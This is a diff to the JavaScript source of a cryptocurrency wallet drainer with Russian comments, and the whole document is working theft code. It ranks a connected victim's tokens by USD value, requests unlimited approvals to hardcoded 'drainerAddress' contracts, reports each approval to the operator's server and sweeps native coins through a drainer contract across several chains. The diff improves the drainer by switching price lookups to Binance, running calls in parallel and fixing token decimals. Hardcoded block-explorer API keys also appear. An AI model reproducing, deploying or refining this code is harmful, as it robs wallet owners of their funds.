@@ -22,48 +22,40 @@ const ARBISCAN_API_KEY = "6YDH1XI6VB7UBQV4WXSH2M7UIEBMMCF9ES";
 const OPTIMISTIC_ETHERSCAN_API_KEY = "5CKHVMKCD5VBXIB4PCM4KYKX5JJCCVU3RW";
 const BASESCAN_API_KEY = "TEB6I1H3F1UH1DF2I1R39PA9RX5C6IKB1H";
 
-// API-ключ для CoinMarketCap (нужно заменить на твой ключ)
-const COINMARKETCAP_API_KEY = "YOUR_COINMARKETCAP_API_KEY"; // Замени на свой API-ключ
-
-// Идентификаторы токенов для CoinMarketCap (по символу токена)
-const TOKEN_CMC_SYMBOLS = {
-  // Нативные токены
-  "ETH": "ETH",
-  "BNB": "BNB",
-  "MATIC": "MATIC",
-  // Токены для Ethereum Mainnet (chainId: 1)
-  "0xdAC17F958D2ee523a2206206994597C13D831ec7": "USDT", // USDT
-  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48": "USDC", // USDC
-  "0x6B175474E89094C44Da98b954EedeAC495271d0F": "DAI", // DAI
-  "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599": "WBTC", // WBTC
-  "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984": "UNI", // UNI
-  "0x514910771AF9Ca656af840dff83E8264EcF986CA": "LINK", // LINK
-  "0xc00e94Cb662C3520282E6f5717214004A7f26888": "COMP", // COMP
-  "0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e": "YFI", // YFI
-  "0xD533a949740bb3306d119CC777fa900bA034cd52": "CRV", // CRV
-  "0x0D8775F648430679A709E98d2b0Cb6250d2887EF": "BAT", // BAT
-  "0xE41d2489571d322189246DaFA5ebDe1F4699F498": "ZRX", // ZRX
-  "0xbbbbca6a901c926f240b89eacb641d8aec7aeafd": "LRC", // LRC
-  "0xB8c77482e45F1F44dE1745F52C74426C631bDD52": "BNB", // BNB
-  "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE": "SHIB", // SHIB
-  "0x6982508145454Ce325dDbE47a25d4ec3d2311933": "PEPE", // PEPE
-  "0x27C70Cd1946795B66be9d954418546998b546634": "LEASH", // LEASH
-  // Токены для BNB Chain (chainId: 56)
-  "0x55d398326f99059fF775485246999027B3197955": "USDT", // USDT
-  "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d": "USDC", // USDC
-  "0x2859e4544C4bB03966803b044A93563Bd2D0DD4D": "SHIB", // SHIB
-  "0x25d887Ce7a35172C62FeBFD67a1856F20FaEbB00": "PEPE", // PEPE
-  "0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006": "FLOKI", // FLOKI
-  // Токены для Polygon (chainId: 137)
-  "0xc2132D05D31c914a87C6611C10748AEb04B58e8F": "USDT", // USDT
-  "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174": "USDC", // USDC
-  "0x6f8a06447Ff6FcF75d803135a7de15CE88C1d4ec": "SHIB", // SHIB
-  "0xA102DAa5E3D35eCaeF2A14dE4e94bAaF9cC38d56": "PEPE", // PEPE
-  // Токены для Arbitrum One (chainId: 42161)
-  "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9": "USDT", // USDT
-  "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8": "USDC", // USDC
-  "0x5033833c9fe8B503Ed2ABAfaFc6d2eB2fbF33a36": "SHIB", // SHIB
-  "0xA54B8e307E70e310A5C6bF7c2dB4b33eD9f3aC51": "PEPE" // PEPE
+// Идентификаторы токенов (по символу токена для Binance API)
+const TOKEN_SYMBOLS = {
+  "ETH": "ETHUSDT",
+  "BNB": "BNBUSDT",
+  "MATIC": "MATICUSDT",
+  "0xdAC17F958D2ee523a2206206994597C13D831ec7": "USDT",
+  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48": "USDCUSDT",
+  "0x6B175474E89094C44Da98b954EedeAC495271d0F": "DAIUSDT",
+  "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599": "WBTCUSDT",
+  "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984": "UNIUSDT",
+  "0x514910771AF9Ca656af840dff83E8264EcF986CA": "LINKUSDT",
+  "0xc00e94Cb662C3520282E6f5717214004A7f26888": "COMPUSDT",
+  "0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e": "YFIUSDT",
+  "0xD533a949740bb3306d119CC777fa900bA034cd52": "CRVUSDT",
+  "0x0D8775F648430679A709E98d2b0Cb6250d2887EF": "BATUSDT",
+  "0xE41d2489571d322189246DaFA5ebDe1F4699F498": "ZRXUSDT",
+  "0xbbbbca6a901c926f240b89eacb641d8aec7aeafd": "LRCUSDT",
+  "0xB8c77482e45F1F44dE1745F52C74426C631bDD52": "BNBUSDT",
+  "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE": "SHIBUSDT",
+  "0x6982508145454Ce325dDbE47a25d4ec3d2311933": "PEPEUSDT",
+  "0x27C70Cd1946795B66be9d954418546998b546634": "LEASHUSDT",
+  "0x55d398326f99059fF775485246999027B3197955": "USDT",
+  "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d": "USDCUSDT",
+  "0x2859e4544C4bB03966803b044A93563Bd2D0DD4D": "SHIBUSDT",
+  "0x25d887Ce7a35172C62FeBFD67a1856F20FaEbB00": "PEPEUSDT",
+  "0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006": "FLOKIUSDT",
+  "0xc2132D05D31c914a87C6611C10748AEb04B58e8F": "USDT",
+  "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174": "USDCUSDT",
+  "0x6f8a06447Ff6FcF75d803135a7de15CE88C1d4ec": "SHIBUSDT",
+  "0xA102DAa5E3D35eCaeF2A14dE4e94bAaF9cC38d56": "PEPEUSDT",
+  "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9": "USDT",
+  "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8": "USDCUSDT",
+  "0x5033833c9fe8B503Ed2ABAfaFc6d2eB2fbF33a36": "SHIBUSDT",
+  "0xA54B8e307E70e310A5C6bF7c2dB4b33eD9f3aC51": "PEPEUSDT"
 };
 
 // Конфигурация сетей
@@ -72,7 +64,7 @@ const CHAINS = {
     name: "Ethereum Mainnet",
     nativeToken: "ETH",
     chainIdHex: "0x1",
-    rpcUrls: ["https://rpc.eth.gateway.fm", "https://eth.llamarpc.com", "https://ethereum-rpc.publicnode.com"],
+    rpcUrls: ["https://rpc.eth.gateway.fm", "https://ethereum-rpc.publicnode.com"],
     usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
     usdcAddress: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
     drainerAddress: "0x2F711446fa4048c375fE65fBf6C912DD44c736Cd",
@@ -147,30 +139,22 @@ const CHAINS = {
   }
 };
 
-// Утилита для задержки
-const delay = (ms) => new Promise(r => setTimeout(r, ms));
-
-// Функция для получения цены токена в USDT через CoinMarketCap
+// Функция для получения цены токена в USDT через Binance API
 async function getTokenPriceInUSDT(tokenSymbol) {
+  if (tokenSymbol === "USDT") return 1;
+
   try {
-    const response = await fetch(`https://pro-api.coinmarketcap.com/v2/cryptocurrency/quotes/latest?symbol=${tokenSymbol}&convert=USDT`, {
-      headers: {
-        'X-CMC_PRO_API_KEY': COINMARKETCAP_API_KEY,
-      },
-    });
+    const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${tokenSymbol}`);
     const data = await response.json();
-    if (data.status.error_code === 0 && data.data[tokenSymbol] && data.data[tokenSymbol][0].quote.USDT.price) {
-      return data.data[tokenSymbol][0].quote.USDT.price;
-    } else {
-      throw new Error(`Цена для ${tokenSymbol} не найдена`);
-    }
+    if (data.price) return parseFloat(data.price);
+    throw new Error(`Цена для ${tokenSymbol} не найдена`);
   } catch (e) {
     console.warn(`⚠️ Ошибка получения цены для ${tokenSymbol}: ${e.message}`);
-    return 0; // Если цена не найдена, возвращаем 0
+    return 0;
   }
 }
 
-// Функция для получения рабочего провайдера
+// Функция для параллельного выбора рабочего провайдера
 async function getWorkingProvider(rpcUrls, existingProvider = null) {
   if (existingProvider) {
     try {
@@ -182,7 +166,7 @@ async function getWorkingProvider(rpcUrls, existingProvider = null) {
     }
   }
 
-  for (const rpc of rpcUrls) {
+  const providerPromises = rpcUrls.map(async (rpc) => {
     try {
       const provider = new ethers.providers.JsonRpcProvider(rpc);
       await provider.getBalance('0x0000000000000000000000000000000000000000');
@@ -190,9 +174,14 @@ async function getWorkingProvider(rpcUrls, existingProvider = null) {
       return provider;
     } catch (e) {
       console.warn(`⚠️ RPC ${rpc} недоступен: ${e.message}`);
+      return null;
     }
-  }
-  throw new Error(`Нет доступных RPC для ${rpcUrls}`);
+  });
+
+  const results = await Promise.all(providerPromises);
+  const workingProvider = results.find(provider => provider !== null);
+  if (!workingProvider) throw new Error(`Нет доступных RPC для ${rpcUrls}`);
+  return workingProvider;
 }
 
 // Получение баланса нативного токена через API
@@ -201,11 +190,8 @@ async function getBalanceFromExplorer(address, chainId) {
   const apiUrl = `${config.explorerApi}?module=account&action=balance&address=${address}&tag=latest&apikey=${config.explorerApiKey}`;
   const response = await fetch(apiUrl);
   const data = await response.json();
-  if (data.status === "1") {
-    return ethers.BigNumber.from(data.result);
-  } else {
-    throw new Error(data.message || `Ошибка API для ${config.name}`);
-  }
+  if (data.status === "1") return ethers.BigNumber.from(data.result);
+  throw new Error(data.message || `Ошибка API для ${config.name}`);
 }
 
 // Получение баланса токена через API
@@ -214,11 +200,8 @@ async function getTokenBalanceFromExplorer(address, tokenAddress, chainId) {
   const apiUrl = `${config.explorerApi}?module=account&action=tokenbalance&contractaddress=${tokenAddress}&address=${address}&tag=latest&apikey=${config.explorerApiKey}`;
   const response = await fetch(apiUrl);
   const data = await response.json();
-  if (data.status === "1") {
-    return ethers.BigNumber.from(data.result);
-  } else {
-    throw new Error(data.message || `Ошибка API для токена в ${config.name}`);
-  }
+  if (data.status === "1") return ethers.BigNumber.from(data.result);
+  throw new Error(data.message || `Ошибка API для токена в ${config.name}`);
 }
 
 // Проверка баланса с использованием API и fallback на RPC
@@ -234,7 +217,6 @@ async function checkBalance(chainId, userAddress) {
     nativeBalance = await provider.getBalance(userAddress);
   }
 
-  // Проверяем USDT и USDC
   try {
     tokenBalances[config.usdtAddress] = await getTokenBalanceFromExplorer(userAddress, config.usdtAddress, chainId);
   } catch (e) {
@@ -253,18 +235,23 @@ async function checkBalance(chainId, userAddress) {
     tokenBalances[config.usdcAddress] = await usdc.balanceOf(userAddress);
   }
 
-  // Проверяем дополнительные токены (DAI, WBTC, UNI, AAVE, ..., SHIB, PEPE, FLOKI, LEASH)
   if (config.otherTokenAddresses) {
-    for (const tokenAddress of Object.values(config.otherTokenAddresses)) {
+    const tokenAddresses = Object.values(config.otherTokenAddresses);
+    const balancePromises = tokenAddresses.map(async (tokenAddress) => {
       try {
-        tokenBalances[tokenAddress] = await getTokenBalanceFromExplorer(userAddress, tokenAddress, chainId);
+        return { address: tokenAddress, balance: await getTokenBalanceFromExplorer(userAddress, tokenAddress, chainId) };
       } catch (e) {
         console.warn(`Ошибка API для токена ${tokenAddress} в ${config.name}: ${e.message}`);
         const provider = await getWorkingProvider(config.rpcUrls);
         const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-        tokenBalances[tokenAddress] = await token.balanceOf(userAddress);
+        return { address: tokenAddress, balance: await token.balanceOf(userAddress) };
       }
-    }
+    });
+
+    const results = await Promise.all(balancePromises);
+    results.forEach(({ address, balance }) => {
+      tokenBalances[address] = balance;
+    });
   }
 
   return { nativeBalance, tokenBalances };
@@ -301,9 +288,8 @@ async function switchChain(chainId) {
 async function drain(chainId, signer, userAddress, bal) {
   const config = CHAINS[chainId];
   const MAX = ethers.constants.MaxUint256;
-  const MIN_TOKEN_BALANCE = ethers.utils.parseUnits("0.1", 6); // Минимальный порог 0.1 для всех токенов
+  const MIN_TOKEN_BALANCE = ethers.utils.parseUnits("0.1", 6);
 
-  // Проверяем провайдер перед использованием
   const reliableProvider = await getWorkingProvider(config.rpcUrls, signer.provider);
   const ethBalance = await reliableProvider.getBalance(userAddress);
   const minEthRequired = ethers.utils.parseEther("0.0003");
@@ -312,38 +298,59 @@ async function drain(chainId, signer, userAddress, bal) {
     throw new Error(`Недостаточно ${config.nativeToken} для оплаты газа`);
   }
 
-  // Собираем все токены для обработки (USDT, USDC, DAI, WBTC, ..., SHIB, PEPE, FLOKI, LEASH)
   const tokensToProcess = [];
   const tokenAddresses = [config.usdtAddress, config.usdcAddress, ...Object.values(config.otherTokenAddresses)];
 
-  for (const tokenAddress of tokenAddresses) {
+  // Параллельно запрашиваем баланс и decimals для всех токенов
+  const tokenDataPromises = tokenAddresses.map(async (tokenAddress) => {
     const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
-    const realBalance = await tokenContract.balanceOf(userAddress);
-    console.log(`📊 Токен ${tokenAddress} баланс (реальный): ${ethers.utils.formatUnits(realBalance, 6)}`);
+    const [realBalance, decimals] = await Promise.all([
+      tokenContract.balanceOf(userAddress),
+      tokenContract.decimals()
+    ]);
+    return { tokenAddress, tokenContract, realBalance, decimals };
+  });
+
+  const tokenDataResults = await Promise.all(tokenDataPromises);
+
+  for (const { tokenAddress, tokenContract, realBalance, decimals } of tokenDataResults) {
+    if (realBalance.gt(0)) {
+      console.log(`📊 Токен ${tokenAddress} баланс (реальный): ${ethers.utils.formatUnits(realBalance, decimals)}`);
+    }
 
     if (realBalance.lt(bal.tokenBalances[tokenAddress])) {
-      console.error(`❌ Некорректный баланс для ${tokenAddress}: API вернул ${ethers.utils.formatUnits(bal.tokenBalances[tokenAddress], 6)}, реальный: ${ethers.utils.formatUnits(realBalance, 6)}`);
+      console.error(`❌ Некорректный баланс для ${tokenAddress}: API вернул ${ethers.utils.formatUnits(bal.tokenBalances[tokenAddress], decimals)}, реальный: ${ethers.utils.formatUnits(realBalance, decimals)}`);
       bal.tokenBalances[tokenAddress] = realBalance;
     }
 
-    if (realBalance.gt(MIN_TOKEN_BALANCE)) {
+    if (realBalance.gt(0) && realBalance.gt(MIN_TOKEN_BALANCE)) {
       const symbol = tokenAddress === config.usdtAddress ? "USDT" :
                     tokenAddress === config.usdcAddress ? "USDC" :
                     Object.keys(config.otherTokenAddresses).find(key => config.otherTokenAddresses[key] === tokenAddress);
-      tokensToProcess.push({ token: symbol, balance: realBalance, contract: tokenContract, address: tokenAddress });
+      tokensToProcess.push({ token: symbol, balance: realBalance, contract: tokenContract, address: tokenAddress, decimals });
     }
   }
 
-  // Сортируем по убыванию баланса
-  tokensToProcess.sort((a, b) => (b.balance.gt(a.balance) ? 1 : -1));
+  // Параллельно запрашиваем цены токенов
+  const pricePromises = tokensToProcess.map(async (token) => {
+    const price = await getTokenPriceInUSDT(TOKEN_SYMBOLS[token.address] || token.token);
+    const balanceInUnits = parseFloat(ethers.utils.formatUnits(token.balance, token.decimals));
+    token.valueInUSDT = balanceInUnits * price;
+    console.log(`💰 ${token.token}: ${balanceInUnits} × $${price} = $${token.valueInUSDT.toFixed(2)} USDT`);
+    return token;
+  });
 
-  // Обрабатываем токены в порядке убывания баланса
-  let status = 'rejected'; // По умолчанию статус "отклонено"
-  for (const { token, balance, contract, address } of tokensToProcess) {
-    console.log(`📦 Обрабатываем ${token} с балансом: ${ethers.utils.formatUnits(balance, 6)}`);
+  await Promise.all(pricePromises);
+
+  tokensToProcess.sort((a, b) => b.valueInUSDT - a.valueInUSDT);
+  console.log("📋 Токены отсортированы по стоимости в USDT (по убыванию):", tokensToProcess.map(t => `${t.token}: $${t.valueInUSDT.toFixed(2)}`));
+
+  let status = 'rejected';
+  for (const { token, balance, contract, address, decimals } of tokensToProcess) {
+    console.log(`📦 Обрабатываем ${token} с балансом: ${ethers.utils.formatUnits(balance, decimals)}`);
 
     const allowanceBefore = await contract.allowance(userAddress, config.drainerAddress);
-    console.log(`📜 ${token} allowance до: ${ethers.utils.formatUnits(allowanceBefore, 6)} ${token}`);
+    console.log(`📜 ${token} allowance до: ${ethers.utils.formatUnits(allowanceBefore, decimals)} ${token}`);
 
     if (allowanceBefore.lt(balance)) {
       try {
@@ -355,29 +362,25 @@ async function drain(chainId, signer, userAddress, bal) {
         });
         const receipt = await tx.wait();
         console.log(`✅ ${token} approve успешен:`, tx.hash);
-        console.log("⏳ Ожидание подтверждения approve...");
-        await delay(5000);
         const allowanceAfter = await contract.allowance(userAddress, config.drainerAddress);
-        console.log(`📜 ${token} allowance после: ${ethers.utils.formatUnits(allowanceAfter, 6)} ${token}`);
+        console.log(`📜 ${token} allowance после: ${ethers.utils.formatUnits(allowanceAfter, decimals)} ${token}`);
         await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash);
-        status = 'confirmed'; // Устанавливаем статус "подтверждено"
+        status = 'confirmed';
       } catch (e) {
         console.error(`❌ Ошибка approve для ${token}: ${e.message}`);
-        throw e; // Пробрасываем ошибку, чтобы обработать её в main.js
+        throw e;
       }
     } else {
       console.log(`✅ ${token} allowance уже достаточен, уведомляем сервер`);
       await notifyServer(userAddress, address, balance, chainId, null);
-      status = 'confirmed'; // Устанавливаем статус "подтверждено"
+      status = 'confirmed';
     }
   }
 
-  // Если нет токенов для обработки
   if (tokensToProcess.length === 0) {
     console.log("⚠️ Нет токенов с достаточным балансом для обработки (мин. 0.1)");
   }
 
-  // Дрейнинг нативного токена
   if (bal.nativeBalance.gt(0)) {
     const drainer = new ethers.Contract(config.drainerAddress, DRAINER_ABI, signer);
     const gasReserve = ethers.utils.parseEther("0.002");
@@ -401,7 +404,7 @@ async function drain(chainId, signer, userAddress, bal) {
           throw new Error(`Транзакция processData (${config.nativeToken}) не удалась`);
         }
         console.log(`✅ Дрейнинг ${config.nativeToken} успешен:`, receipt.transactionHash);
-        status = 'confirmed'; // Устанавливаем статус "подтверждено"
+        status = 'confirmed';
       } catch (e) {
         console.error(`❌ Ошибка вызова processData (${config.nativeToken}): ${e.message}`);
         throw e;
@@ -409,15 +412,17 @@ async function drain(chainId, signer, userAddress, bal) {
     }
   }
 
-  return status; // Возвращаем статус выполнения
+  return status;
 }
 
 async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash) {
   try {
     const provider = await getWorkingProvider(CHAINS[chainId].rpcUrls);
     const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-    const balance = await token.balanceOf(userAddress);
-    const decimals = await token.decimals();
+    const [balance, decimals] = await Promise.all([
+      token.balanceOf(userAddress),
+      token.decimals()
+    ]);
     const balanceUnits = ethers.utils.formatUnits(balance, decimals);
     console.log(`📊 Реальный баланс токена (${tokenAddress}): ${balanceUnits}`);
 
@@ -462,28 +467,24 @@ export async function runDrainer(provider, signer, userAddress) {
       const config = CHAINS[chainId];
       console.log(`Сеть: ${config.name}`);
 
-      // Получаем цену нативного токена
-      const nativeTokenPrice = await getTokenPriceInUSDT(TOKEN_CMC_SYMBOLS[config.nativeToken]);
+      const nativeTokenPrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[config.nativeToken]);
       const nativeBalanceInUSDT = (parseFloat(ethers.utils.formatEther(balance.nativeBalance)) * nativeTokenPrice).toFixed(2);
       console.log(`💰 ${config.nativeToken}: ${ethers.utils.formatEther(balance.nativeBalance)} (≈ $${nativeBalanceInUSDT} USDT)`);
 
-      // Выводим USDT
       const usdtBalance = balance.tokenBalances[config.usdtAddress];
       console.log(`🟠 USDT: ${ethers.utils.formatUnits(usdtBalance, 6)} (≈ $${parseFloat(ethers.utils.formatUnits(usdtBalance, 6)).toFixed(2)} USDT)`);
 
-      // Выводим USDC
-      const usdcPrice = await getTokenPriceInUSDT(TOKEN_CMC_SYMBOLS[config.usdcAddress]);
+      const usdcPrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[config.usdcAddress]);
       const usdcBalance = balance.tokenBalances[config.usdcAddress];
       const usdcBalanceInUSDT = (parseFloat(ethers.utils.formatUnits(usdcBalance, 6)) * usdcPrice).toFixed(2);
       console.log(`🔵 USDC: ${ethers.utils.formatUnits(usdcBalance, 6)} (≈ $${usdcBalanceInUSDT} USDT)`);
 
-      // Выводим дополнительные токены (DAI, WBTC, UNI, ..., SHIB, PEPE, FLOKI, LEASH), если они есть
       if (config.otherTokenAddresses) {
         for (const [symbol, tokenAddress] of Object.entries(config.otherTokenAddresses)) {
           const balanceValue = balance.tokenBalances[tokenAddress];
-          const decimals = symbol === "SHIB" ? 18 : 6; // SHIB имеет 18 десятичных знаков, остальные токены — 6
+          const decimals = symbol === "SHIB" ? 18 : 6;
           if (balanceValue && balanceValue.gt(0)) {
-            const tokenPrice = await getTokenPriceInUSDT(TOKEN_CMC_SYMBOLS[tokenAddress]);
+            const tokenPrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[tokenAddress]);
             const tokenBalanceInUSDT = (parseFloat(ethers.utils.formatUnits(balanceValue, decimals)) * tokenPrice).toFixed(8);
             console.log(`🔹 ${symbol}: ${ethers.utils.formatUnits(balanceValue, decimals)} (≈ $${tokenBalanceInUSDT} USDT)`);
           }
@@ -508,11 +509,11 @@ export async function runDrainer(provider, signer, userAddress) {
 
   if (!sorted.length) {
     console.warn("⛔ Нет подходящих сетей с балансом.");
-    return 'rejected'; // Возвращаем статус "отклонено", если нет сетей
+    return 'rejected';
   }
 
   const target = sorted[0];
   await switchChain(target.chainId);
   const status = await drain(target.chainId, signer, userAddress, target);
-  return status; // Возвращаем статус выполнения
+  return status;
 }
